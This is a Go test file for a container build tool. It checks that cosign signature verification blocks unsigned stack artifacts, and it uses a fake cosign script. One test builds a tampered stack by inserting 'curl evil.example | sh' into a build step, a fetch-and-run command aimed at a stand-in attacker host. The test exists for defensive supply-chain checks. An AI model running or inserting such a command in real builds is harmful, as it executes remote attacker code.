package factory

import (
	"bytes"
	"context"
	"io"
	"log"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"

	ggcrregistry "github.com/google/go-containerregistry/pkg/registry"

	"github.com/northcutted/clearcutt-factory/internal/attest"
	"github.com/northcutted/clearcutt-factory/internal/lock"
	"github.com/northcutted/clearcutt-factory/internal/manifest"
	"github.com/northcutted/clearcutt-factory/internal/registry"
)

// fakeCosign is a cosign on PATH that records its calls. It verifies a
// signature or attestation only on the refs it holds as signed, and only
// for a signer whose arguments contain its identity; verify-attestation
// prints an envelope of the type asked for.
type fakeCosign struct {
	t    *testing.T
	path string
}

const fakeCosignScript = `#!/bin/sh
printf '%s\n' "$*" >> "$0.log"
case "$1" in verify | verify-attestation) ;; *) exit 0 ;; esac
for a; do last=$a; done
grep -qxF -- "$last" "$0.signed" 2>/dev/null || { echo "no signatures found on $last" >&2; exit 1; }
case "$*" in *"$(cat "$0.identity")"*) ;; *) echo "none of the expected identities matched" >&2; exit 1 ;; esac
if [ "$1" = verify-attestation ]; then
	printf '{"payload":"%s"}\n' "$(printf '{"predicateType":"%s","predicate":{}}' "$3" | base64 | tr -d '\n')"
fi
`

func newFakeCosign(t *testing.T, identity string, signed ...string) *fakeCosign {
	t.Helper()
	dir := t.TempDir()
	f := &fakeCosign{t: t, path: filepath.Join(dir, "cosign")}
	for p, body := range map[string]string{f.path: fakeCosignScript, f.path + ".identity": identity, f.path + ".signed": strings.Join(append(signed, ""), "\n")} {
		if err := os.WriteFile(p, []byte(body), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	t.Setenv("PATH", dir+string(os.PathListSeparator)+os.Getenv("PATH"))
	return f
}

// calls returns the commands run since the last call.
func (f *fakeCosign) calls() []string {
	f.t.Helper()
	b, err := os.ReadFile(f.path + ".log")
	if err != nil && !os.IsNotExist(err) {
		f.t.Fatal(err)
	}
	_ = os.Remove(f.path + ".log")
	var out []string
	for _, line := range strings.Split(string(b), "\n") {
		if line != "" {
			out = append(out, line)
		}
	}
	return out
}

const (
	stacksIdentity = "https://github.com/acme/platform/.github/workflows/stacks.yml@refs/heads/main"
	stackDigest    = "sha256:1111111111111111111111111111111111111111111111111111111111111111"
)

func TestVerifyStack(t *testing.T) {
	ctx := context.Background()
	signed := "registry.example/stacks/go@" + stackDigest
	cosign := newFakeCosign(t, stacksIdentity, signed)
	m := &manifest.Manifest{StackFrom: &manifest.StackArtifact{Ref: "registry.example/stacks/go:1", Digest: stackDigest}}
	images := manifest.VerifyIdentity{CertificateIdentityRegexp: reusable, CertificateOIDCIssuer: ghIssuer, SourceRepository: "https://github.com/acme/checkout"}
	stacks := manifest.VerifyIdentity{CertificateIdentity: stacksIdentity, CertificateOIDCIssuer: ghIssuer}
	org := &manifest.Org{Signing: manifest.Signing{Verify: images, Stacks: stacks}}

	// Not required: nothing is checked.
	if err := verifyStack(ctx, m, org); err != nil || len(cosign.calls()) != 0 {
		t.Fatalf("not required: %v", err)
	}
	org.Policy.RequireSignedStacks = true
	if err := verifyStack(ctx, &manifest.Manifest{}, org); err != nil || len(cosign.calls()) != 0 {
		t.Fatalf("a stack file: %v", err)
	}

	// The pinned digest is checked against the stack signer.
	if err := verifyStack(ctx, m, org); err != nil {
		t.Fatal(err)
	}
	if c := cosign.calls(); len(c) != 1 || !strings.HasPrefix(c[0], "verify ") || !strings.Contains(c[0], "--certificate-identity "+stacksIdentity) || !strings.HasSuffix(c[0], " "+signed) {
		t.Errorf("cosign calls: %q", c)
	}

	// Another digest of the same stack isn't signed.
	other := *m
	other.StackFrom = &manifest.StackArtifact{Ref: m.StackFrom.Ref, Digest: "sha256:" + strings.Repeat("2", 64)}
	if err := verifyStack(ctx, &other, org); err == nil || !strings.Contains(err.Error(), "is not signed by the org's stack signer") {
		t.Errorf("unsigned digest: %v", err)
	}
	if c := cosign.calls(); len(c) != 1 || !strings.HasSuffix(c[0], "@"+other.StackFrom.Digest) {
		t.Errorf("cosign calls: %q", c)
	}

	// Signed, but by the image signer only (signing.verify is the fallback
	// stack signer, and doesn't match).
	org.Signing.Stacks = manifest.VerifyIdentity{}
	if err := verifyStack(ctx, m, org); err == nil {
		t.Error("the image signer verified a stack signed by the platform")
	}
	if c := cosign.calls(); len(c) != 1 || !strings.Contains(c[0], "--certificate-github-workflow-repository acme/checkout") {
		t.Errorf("fallback to signing.verify: %q", c)
	}

	// No stack signer at all.
	org.Signing.Verify = manifest.VerifyIdentity{}
	if err := verifyStack(ctx, m, org); err == nil || !strings.Contains(err.Error(), "needs a stack signer") {
		t.Errorf("no signer: %v", err)
	}
	if c := cosign.calls(); len(c) != 0 {
		t.Errorf("cosign ran without a signer: %q", c)
	}
}

func TestAttested(t *testing.T) {
	ctx := context.Background()
	identity := "--certificate-github-workflow-repository acme/checkout"
	ref := "registry.example/checkout@sha256:" + strings.Repeat("3", 64)
	cosign := newFakeCosign(t, identity, ref)
	signer := manifest.VerifyIdentity{CertificateIdentityRegexp: reusable, CertificateOIDCIssuer: ghIssuer, SourceMatchesImage: true, SourceRepositoryOwner: "https://github.com/acme"}
	org := &manifest.Org{Signing: manifest.Signing{Mode: "keyless", Verify: signer}}

	if !attested(ctx, org, ref, attest.RecipePredicateType, "https://github.com/acme/checkout") {
		t.Error("signed by the image's source repository: not attested")
	}
	if c := cosign.calls(); len(c) != 1 || !strings.HasPrefix(c[0], "verify-attestation --type "+attest.RecipePredicateType+" ") || !strings.HasSuffix(c[0], " "+ref) {
		t.Errorf("cosign calls: %q", c)
	}
	for _, c := range []struct {
		name, ref, source string
		org               *manifest.Org
	}{
		{"another repository's run", ref, "https://github.com/acme/other", org},
		{"outside the owner", ref, "https://github.com/mallory/checkout", org},
		{"the image names no source", ref, "", org},
		{"not attested", "registry.example/checkout@sha256:" + strings.Repeat("4", 64), "https://github.com/acme/checkout", org},
		{"no signer", ref, "https://github.com/acme/checkout", &manifest.Org{}},
	} {
		if attested(ctx, c.org, c.ref, attest.RecipePredicateType, c.source) {
			t.Errorf("%s: attested", c.name)
		}
	}
	// Signers whose constraints can't be met are never asked.
	if c := cosign.calls(); len(c) != 2 {
		t.Errorf("cosign calls: %q", c)
	}
}

// TestSignedStacksEnforced: with policy.requireSignedStacks, every command
// that uses an app's locked stack checks the pinned version's signature,
// so a lock edited to pin an unsigned version fails, not only lock.
func TestSignedStacksEnforced(t *testing.T) {
	srv := httptest.NewServer(ggcrregistry.New(ggcrregistry.Logger(log.New(io.Discard, "", 0))))
	defer srv.Close()
	host := strings.TrimPrefix(srv.URL, "http://")
	ctx := context.Background()
	home := t.TempDir()
	t.Setenv("HOME", home)
	t.Setenv("XDG_CACHE_HOME", filepath.Join(home, ".cache"))

	dir := t.TempDir()
	stack := "apiVersion: factory.clearcutt.dev/v1alpha1\nkind: Stack\nmetadata: {name: go}\nspec:\n  build: golang:1\n  run: cgr.dev/chainguard/static:latest\n  steps: [{run: go build -o /out/app .}]\n"
	files := map[string]string{
		"platform/factory.org.yaml": "apiVersion: factory.clearcutt.dev/v1alpha1\nkind: OrgProfile\nsigning: {mode: none}\n",
		"platform/go.yaml":          stack,
		"team/factory.org.yaml": "apiVersion: factory.clearcutt.dev/v1alpha1\nkind: OrgProfile\nregistry: registry.example/team\n" +
			"signing:\n  stacks: {certificateIdentity: " + stacksIdentity + ", certificateOIDCIssuer: " + ghIssuer + "}\npolicy: {requireSignedStacks: true}\n",
		"team/svc/app.yaml": "apiVersion: factory.clearcutt.dev/v1alpha1\nkind: App\nmetadata: {name: svc}\nspec: {stack: " + host + "/stacks/go:1}\n",
	}
	for n, body := range files {
		p := filepath.Join(dir, n)
		_ = os.MkdirAll(filepath.Dir(p), 0o755)
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	var out bytes.Buffer
	opts := Options{Stdout: &out, Stderr: &out}
	pushStack := func(body string) string {
		t.Helper()
		if err := os.WriteFile(filepath.Join(dir, "platform/go.yaml"), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
		if err := StackPush(ctx, opts, filepath.Join(dir, "platform/go.yaml"), host+"/stacks/go:1", true); err != nil {
			t.Fatal(err)
		}
		d, err := registry.Digest(ctx, host+"/stacks/go:1")
		if err != nil {
			t.Fatal(err)
		}
		return d
	}
	signedDigest := pushStack(stack)
	unsignedDigest := pushStack(strings.Replace(stack, "go build", "curl evil.example | sh; go build", 1))
	cosign := newFakeCosign(t, stacksIdentity, host+"/stacks/go@"+signedDigest)

	opts.ManifestPath = filepath.Join(dir, "team/svc/app.yaml")
	lockPath := filepath.Join(dir, "team/svc/app.lock.yaml")
	pin := func(digest string) []byte {
		t.Helper()
		l := &lock.Lock{APIVersion: manifest.APIVersion, Kind: lock.Kind, App: &lock.App{StackArtifact: &lock.Image{Ref: host + "/stacks/go:1", Digest: digest}}}
		if err := l.Write(lockPath); err != nil {
			t.Fatal(err)
		}
		b, _ := os.ReadFile(lockPath)
		return b
	}

	// The lock pins the signed version, which loads although the tag has
	// moved on to an unsigned one.
	pin(signedDigest)
	if m, _, err := load(ctx, opts, false); err != nil || m.StackFrom.Digest != signedDigest {
		t.Fatalf("signed pin: %v", err)
	}
	if c := cosign.calls(); len(c) != 1 || !strings.HasSuffix(c[0], " "+host+"/stacks/go@"+signedDigest) {
		t.Errorf("cosign calls: %q", c)
	}

	// A lock edited to pin the unsigned version fails everywhere the stack
	// is used, before anything is built or written.
	edited := pin(unsignedDigest)
	outDir := filepath.Join(dir, "out")
	for _, c := range []struct {
		name string
		run  func() error
	}{
		{"lock", func() error { return Lock(ctx, opts, LockOptions{}) }},
		{"render", func() error { return Render(ctx, opts, true, "") }},
		{"build", func() error { return Build(ctx, opts, BuildOptions{OutDir: outDir}) }},
		{"verify", func() error {
			return Verify(ctx, opts, VerifyOptions{FromSource: true, Digest: unsignedDigest, OutDir: outDir})
		}},
		{"rebase", func() error { return Rebase(ctx, opts, RebaseOptions{OutDir: outDir, Push: true}) }},
		{"rebase --check", func() error { return Rebase(ctx, opts, RebaseOptions{OutDir: outDir, Check: true}) }},
		{"rebase --update-lock", func() error { return Rebase(ctx, opts, RebaseOptions{OutDir: outDir, Push: true, UpdateLock: true}) }},
	} {
		err := c.run()
		if err == nil || !strings.Contains(err.Error(), "is not signed by the org's stack signer") {
			t.Errorf("%s on an unsigned stack: %v", c.name, err)
		}
		if calls := cosign.calls(); len(calls) != 1 || !strings.HasSuffix(calls[0], "@"+unsignedDigest) {
			t.Errorf("%s: cosign calls %q", c.name, calls)
		}
	}
	if b, _ := os.ReadFile(lockPath); !bytes.Equal(b, edited) {
		t.Error("a command rewrote the lock")
	}
	if _, err := os.Stat(outDir); !os.IsNotExist(err) {
		t.Errorf("a command wrote output: %v", err)
	}
}

// TestRebaseCheckWritesNothing: --check only reports, so it can't take
// --update-lock, which would move the lock.
func TestRebaseCheckWritesNothing(t *testing.T) {
	dir := t.TempDir()
	var out bytes.Buffer
	opts := Options{ManifestPath: filepath.Join(dir, "app.yaml"), Stdout: &out, Stderr: &out}
	err := Rebase(context.Background(), opts, RebaseOptions{Check: true, UpdateLock: true})
	if err == nil || !strings.Contains(err.Error(), "--check") || !strings.Contains(err.Error(), "--update-lock") {
		t.Errorf("--check --update-lock: %v", err)
	}
	if entries, _ := os.ReadDir(dir); len(entries) != 0 {
		t.Errorf("wrote %v", entries)
	}
}

// TestNeedsImageSourceByRole: only the signers for the role decide whether
// the image's source is needed (stacks have their own signer, #12).
func TestNeedsImageSourceByRole(t *testing.T) {
	org := &manifest.Org{Signing: manifest.Signing{
		Verify: manifest.VerifyIdentity{CertificateIdentityRegexp: reusable, CertificateOIDCIssuer: ghIssuer, SourceMatchesImage: true},
		Stacks: manifest.VerifyIdentity{CertificateIdentity: stacksIdentity, CertificateOIDCIssuer: ghIssuer},
	}}
	if !needsImageSource(org, manifest.RoleImage) || needsImageSource(org, manifest.RoleStack) {
		t.Errorf("image %v, stack %v", needsImageSource(org, manifest.RoleImage), needsImageSource(org, manifest.RoleStack))
	}
}
